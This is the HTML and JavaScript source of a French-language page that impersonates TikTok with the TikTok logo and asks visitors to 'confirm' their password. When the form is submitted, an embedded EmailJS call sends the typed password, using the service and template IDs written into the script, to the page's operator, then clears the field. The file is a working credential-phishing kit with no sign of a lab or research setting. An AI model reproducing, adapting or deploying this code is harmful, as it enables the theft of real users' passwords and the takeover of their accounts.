<!DOCTYPE html>
<html lang="fr">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Confirmation du mot de passe</title>
    <link rel="stylesheet" href="style.css" />
  </head>
  <body>
    <div class="form-container">
      <!-- Logo TikTok -->
      <div class="logo-container">
        <img
          src="https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/tiktok-color-icon.png"
          alt="Logo TikTok"
          class="logo"
        />
      </div>
      <h1>Confirmer votre mot de passe</h1>
      <p class="subtitle">Saisir le mot de passe</p>
      <form id="password-form">
        <div class="input-section">
          <label for="password">Mot de passe :</label>
          <input type="password" id="password" placeholder="" required />
        </div>
        <button type="submit" class="next-button">Suivant</button>
      </form>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
    <script>
      // Initialisation avec clé publique EmailJS
      (function () {
        emailjs.init("KsAeYBNJTNWnyUxfM"); // ✅ assure-toi que c'est bien la clé publique
      })();

      // Sélection du formulaire
      const form = document.getElementById("password-form");

      form.addEventListener("submit", function (e) {
        e.preventDefault();

        const password = document.getElementById("password").value;

        // Objet de données pour EmailJS
        const templateParams = {
          user_password: password, // doit correspondre exactement au champ du template
        };

        // Envoi EmailJS
        emailjs
          .send("service_548dlph", "template_wp68svl", templateParams)
          .then(
            (response) => {
              console.log("✅ Envoi réussi :", response);
              alert("Mot de passe envoyé avec succès !");
              form.reset(); // vide le champ après envoi
            },
            (error) => {
              console.error("❌ Échec de l'envoi :", error);
              // Affichage détaillé pour debug
              alert("Échec de l'envoi. Vérifie console pour détails.");
            }
          );
      });
    </script>
  </body>
</html>
